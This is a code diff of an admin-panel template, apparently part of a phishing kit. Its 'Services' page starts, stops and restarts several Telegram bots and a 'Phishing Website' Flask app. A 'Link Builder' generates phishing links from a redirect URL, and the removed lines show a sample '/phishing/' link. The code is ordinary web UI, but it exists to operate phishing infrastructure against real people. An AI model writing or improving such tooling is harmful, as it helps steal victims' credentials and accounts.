@@ -5,62 +5,400 @@
 {% block content %}
 <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
     <h1 class="h2">Services</h1>
+    <div class="btn-toolbar mb-2 mb-md-0">
+        <button class="btn btn-success me-2" onclick="startAllServices()">
+            <i class="fas fa-play"></i> Start All
+        </button>
+        <button class="btn btn-danger" onclick="stopAllServices()">
+            <i class="fas fa-stop"></i> Stop All
+        </button>
+    </div>
 </div>
 
+<!-- Services Status -->
 <div class="row">
-    <div class="col-md-6">
+    <div class="col-12">
         <div class="card">
             <div class="card-header">
-                <h5>Статус сервісів</h5>
+                <h5>Status Services</h5>
             </div>
             <div class="card-body">
-                <div class="mb-3">
-                    <span class="badge bg-success">Online</span>
-                    WebApp Bot
+                <div class="table-responsive">
+                    <table class="table table-striped">
+                        <thead>
+                            <tr>
+                                <th>Status</th>
+                                <th>Service</th>
+                                <th>Description</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- Admin Bot -->
+                            <tr>
+                                <td>
+                                    <span class="badge bg-{{ 'success' if services_status.admin_bot == 'online' else 'danger' }}" id="adminBotStatus">
+                                        {{ services_status.admin_bot|title }}
+                                    </span>
+                                </td>
+                                <td><strong>Admin Bot</strong></td>
+                                <td>Telegram bot for system management</td>
+                                <td>
+                                    <div class="d-flex gap-2">  <!-- 🆕 ДОДАЄМО ВІДСТУПИ -->
+                                        <button class="btn btn-outline-success btn-sm" onclick="startService('admin_bot')" 
+                                                {{ 'disabled' if not can_start_admin_bot }}>
+                                            <i class="fas fa-play"></i> Start
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="stopService('admin_bot')">
+                                            <i class="fas fa-stop"></i> Stop
+                                        </button>
+                                        <button class="btn btn-outline-warning btn-sm" onclick="restartService('admin_bot')"
+                                                {{ 'disabled' if not can_start_admin_bot }}>
+                                            <i class="fas fa-redo"></i> Restart
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+
+                            <!-- WebApp Bot -->
+                            <tr>
+                                <td>
+                                    <span class="badge bg-{{ 'success' if services_status.webapp_bot == 'online' else 'danger' }}" id="webappBotStatus">
+                                        {{ services_status.webapp_bot|title }}
+                                    </span>
+                                </td>
+                                <td><strong>WebApp Bot</strong></td>
+                                <td>Telegram bot with WebApp interface</td>
+                                <td>
+                                    <div class="d-flex gap-2">  <!-- 🆕 ДОДАЄМО ВІДСТУПИ -->
+                                        <button class="btn btn-outline-success btn-sm" onclick="startService('webapp_bot')"
+                                                {{ 'disabled' if not can_start_webapp_bot }}>
+                                            <i class="fas fa-play"></i> Start
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="stopService('webapp_bot')">
+                                            <i class="fas fa-stop"></i> Stop
+                                        </button>
+                                        <button class="btn btn-outline-warning btn-sm" onclick="restartService('webapp_bot')"
+                                                {{ 'disabled' if not can_start_webapp_bot }}>
+                                            <i class="fas fa-redo"></i> Restart
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+
+                            <!-- Classic Bot -->
+                            <tr>
+                                <td>
+                                    <span class="badge bg-{{ 'success' if services_status.classic_bot == 'online' else 'danger' }}" id="classicBotStatus">
+                                        {{ services_status.classic_bot|title }}
+                                    </span>
+                                </td>
+                                <td><strong>Classic Bot</strong></td>
+                                <td>Telegram bot with inline buttons</td>
+                                <td>
+                                    <div class="d-flex gap-2">  <!-- 🆕 ДОДАЄМО ВІДСТУПИ -->
+                                        <button class="btn btn-outline-success btn-sm" onclick="startService('classic_bot')"
+                                                {{ 'disabled' if not can_start_classic_bot }}>
+                                            <i class="fas fa-play"></i> Start
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="stopService('classic_bot')">
+                                            <i class="fas fa-stop"></i> Stop
+                                        </button>
+                                        <button class="btn btn-outline-warning btn-sm" onclick="restartService('classic_bot')"
+                                                {{ 'disabled' if not can_start_classic_bot }}>
+                                            <i class="fas fa-redo"></i> Restart
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+
+                            <!-- Multitool Bot -->
+                            <tr>
+                                <td>
+                                    <span class="badge bg-{{ 'success' if services_status.multitool_bot == 'online' else 'danger' }}" id="multitoolBotStatus">
+                                        {{ services_status.multitool_bot|title }}
+                                    </span>
+                                </td>
+                                <td><strong>Multitool Bot</strong></td>
+                                <td>Telegram bot with useful tools</td>
+                                <td>
+                                    <div class="d-flex gap-2">  <!-- 🆕 ДОДАЄМО ВІДСТУПИ -->
+                                        <button class="btn btn-outline-success btn-sm" onclick="startService('multitool_bot')"
+                                                {{ 'disabled' if not can_start_multitool_bot }}>
+                                            <i class="fas fa-play"></i> Start
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="stopService('multitool_bot')">
+                                            <i class="fas fa-stop"></i> Stop
+                                        </button>
+                                        <button class="btn btn-outline-warning btn-sm" onclick="restartService('multitool_bot')"
+                                                {{ 'disabled' if not can_start_multitool_bot }}>
+                                            <i class="fas fa-redo"></i> Restart
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+
+                            <!-- Phishing Website -->
+                            <tr>
+                                <td>
+                                    <span class="badge bg-{{ 'success' if services_status.phishing_site == 'online' else 'danger' }}" id="phishingSiteStatus">
+                                        {{ services_status.phishing_site|title }}
+                                    </span>
+                                </td>
+                                <td><strong>Phishing Website</strong></td>
+                                <td>Main phishing website (Flask app)</td>
+                                <td>
+                                    <div class="d-flex gap-2">  <!-- 🆕 ДОДАЄМО ВІДСТУПИ -->
+                                        <button class="btn btn-outline-success btn-sm" onclick="startService('phishing_site')">
+                                            <i class="fas fa-play"></i> Start
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="stopService('phishing_site')">
+                                            <i class="fas fa-stop"></i> Stop
+                                        </button>
+                                        <button class="btn btn-outline-warning btn-sm" onclick="restartService('phishing_site')">
+                                            <i class="fas fa-redo"></i> Restart
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
                 </div>
-                <div class="mb-3">
-                    <span class="badge bg-success">Online</span>
-                    Classic Bot
+
+                <!-- Validation Errors -->
+                {% if validation_errors %}
+                <div class="alert alert-warning mt-3">
+                    <h6><i class="fas fa-exclamation-triangle"></i> Validation Errors:</h6>
+                    <ul class="mb-0">
+                        {% for error in validation_errors %}
+                        <li>{{ error }}</li>
+                        {% endfor %}
+                    </ul>
                 </div>
-                <div class="mb-3">
-                    <span class="badge bg-success">Online</span>
-                    Multitool Bot
-                </div>
-                <div class="mb-3">
-                    <span class="badge bg-success">Online</span>
-                    Admin Bot
-                </div>
-                <div class="mb-3">
-                    <span class="badge bg-success">Online</span>
-                    Phishing Website
-                </div>
+                {% endif %}
             </div>
         </div>
     </div>
-    
+</div>
+
+<!-- Link Builder -->
+<div class="row mt-4">
     <div class="col-md-6">
         <div class="card">
             <div class="card-header">
-                <h5>Білдер посилань</h5>
+                <h5>Link Builder</h5>
             </div>
             <div class="card-body">
                 <div class="mb-3">
-                    <label class="form-label">URL для редиректу:</label>
-                    <input type="text" class="form-control" placeholder="https://example.com">
+                    <label class="form-label">Redirect URL:</label>
+                    <input type="text" class="form-control" id="redirectUrl" placeholder="https://example.com">
                 </div>
-                <button class="btn btn-primary w-100">
-                    <i class="fas fa-link"></i> Згенерувати посилання
+                <button class="btn btn-primary w-100" onclick="generateLink()">
+                    <i class="fas fa-link"></i> Generate Link
                 </button>
                 
-                <div class="mt-3">
-                    <label class="form-label">Ваше посилання:</label>
+                <div class="mt-3" id="generatedLink" style="display: none;">
+                    <label class="form-label">Your Link:</label>
                     <div class="input-group">
-                        <input type="text" class="form-control" value="https://ptpanel.com/phishing/abc123" readonly>
-                        <button class="btn btn-outline-secondary" type="button">Copy</button>
+                        <input type="text" class="form-control" id="linkOutput" readonly>
+                        <button class="btn btn-outline-secondary" type="button" onclick="copyLink()">
+                            <i class="fas fa-copy"></i>
+                        </button>
                     </div>
                 </div>
             </div>
         </div>
     </div>
+
+    <!-- Service Information -->
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5>Service Information</h5>
+            </div>
+            <div class="card-body">
+                <div class="mb-2">
+                    <strong>Admin Bot:</strong> 
+                    <span class="{{ 'text-success' if can_start_admin_bot else 'text-danger' }}">
+                        {{ 'Ready' if can_start_admin_bot else 'Missing token' }}
+                    </span>
+                </div>
+                <div class="mb-2">
+                    <strong>WebApp Bot:</strong> 
+                    <span class="{{ 'text-success' if can_start_webapp_bot else 'text-danger' }}">
+                        {{ 'Ready' if can_start_webapp_bot else 'Missing token' }}
+                    </span>
+                </div>
+                <div class="mb-2">
+                    <strong>Classic Bot:</strong> 
+                    <span class="{{ 'text-success' if can_start_classic_bot else 'text-danger' }}">
+                        {{ 'Ready' if can_start_classic_bot else 'Missing token' }}
+                    </span>
+                </div>
+                <div class="mb-2">
+                    <strong>Multitool Bot:</strong> 
+                    <span class="{{ 'text-success' if can_start_multitool_bot else 'text-danger' }}">
+                        {{ 'Ready' if can_start_multitool_bot else 'Missing token' }}
+                    </span>
+                </div>
+                <div class="mb-2">
+                    <strong>Telegram API:</strong> 
+                    <span class="{{ 'text-success' if has_telegram_api else 'text-danger' }}">
+                        {{ 'Configured' if has_telegram_api else 'Not configured' }}
+                    </span>
+                </div>
+                <hr>
+                <small class="text-muted">
+                    <i class="fas fa-info-circle"></i>
+                    Configure missing settings in <a href="/admin/settings">Settings</a>
+                </small>
+            </div>
+        </div>
+    </div>
 </div>
+
+<style>
+/* 🆕 ДОДАЄМО ДОДАТКОВІ СТИЛІ ДЛЯ КНОПОК */
+.btn-group-sm > .btn,
+.btn-sm {
+    padding: 0.25rem 0.5rem;
+    font-size: 0.875rem;
+    border-radius: 0.2rem;
+}
+
+/* Стилі для відступів між кнопками */
+.d-flex.gap-2 > * {
+    margin-right: 0.5rem;
+}
+
+.d-flex.gap-2 > *:last-child {
+    margin-right: 0;
+}
+</style>
+
+<script>
+function startService(service) {
+    fetch(`/admin/services/start/${service}`, {method: 'POST'})
+    .then(response => response.json())
+    .then(result => {
+        if (result.success) {
+            showAlert(`Service ${service} started!`, 'success');
+            updateServiceStatus(service, 'online');
+        } else {
+            showAlert(`Failed to start ${service}: ${result.error}`, 'danger');
+        }
+    });
+}
+
+function stopService(service) {
+    fetch(`/admin/services/stop/${service}`, {method: 'POST'})
+    .then(response => response.json())
+    .then(result => {
+        if (result.success) {
+            showAlert(`Service ${service} stopped!`, 'success');
+            updateServiceStatus(service, 'offline');
+        } else {
+            showAlert(`Failed to stop ${service}: ${result.error}`, 'danger');
+        }
+    });
+}
+
+function restartService(service) {
+    fetch(`/admin/services/restart/${service}`, {method: 'POST'})
+    .then(response => response.json())
+    .then(result => {
+        if (result.success) {
+            showAlert(`Service ${service} restarted!`, 'success');
+            updateServiceStatus(service, 'online');
+        } else {
+            showAlert(`Failed to restart ${service}: ${result.error}`, 'danger');
+        }
+    });
+}
+
+function startAllServices() {
+    if (confirm('Start all services?')) {
+        fetch('/admin/services/start_all', {method: 'POST'})
+        .then(response => response.json())
+        .then(result => {
+            if (result.success) {
+                showAlert('All services started!', 'success');
+                // Update all statuses
+                ['admin_bot', 'webapp_bot', 'classic_bot', 'multitool_bot', 'phishing_site'].forEach(service => {
+                    updateServiceStatus(service, 'online');
+                });
+            } else {
+                showAlert('Failed to start all services', 'danger');
+            }
+        });
+    }
+}
+
+function stopAllServices() {
+    if (confirm('Stop all services?')) {
+        fetch('/admin/services/stop_all', {method: 'POST'})
+        .then(response => response.json())
+        .then(result => {
+            if (result.success) {
+                showAlert('All services stopped!', 'success');
+                // Update all statuses
+                ['admin_bot', 'webapp_bot', 'classic_bot', 'multitool_bot', 'phishing_site'].forEach(service => {
+                    updateServiceStatus(service, 'offline');
+                });
+            } else {
+                showAlert('Failed to stop all services', 'danger');
+            }
+        });
+    }
+}
+
+function updateServiceStatus(service, status) {
+    const statusElement = document.getElementById(service + 'Status');
+    if (statusElement) {
+        statusElement.textContent = status.charAt(0).toUpperCase() + status.slice(1);
+        statusElement.className = `badge bg-${status === 'online' ? 'success' : 'danger'}`;
+    }
+}
+
+function generateLink() {
+    const url = document.getElementById('redirectUrl').value;
+    if (!url) {
+        showAlert('Please enter a redirect URL', 'warning');
+        return;
+    }
+
+    fetch('/admin/services/generate_link', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({url: url})
+    })
+    .then(response => response.json())
+    .then(result => {
+        if (result.success) {
+            document.getElementById('linkOutput').value = result.generated_link;
+            document.getElementById('generatedLink').style.display = 'block';
+        } else {
+            showAlert('Failed to generate link', 'danger');
+        }
+    });
+}
+
+function copyLink() {
+    const linkInput = document.getElementById('linkOutput');
+    linkInput.select();
+    document.execCommand('copy');
+    showAlert('Link copied to clipboard!', 'success');
+}
+
+function showAlert(message, type) {
+    const alertDiv = document.createElement('div');
+    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+    alertDiv.innerHTML = `
+        ${message}
+        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+    `;
+    document.querySelector('.main-content').prepend(alertDiv);
+    setTimeout(() => alertDiv.remove(), 5000);
+}
+</script>
 {% endblock %}
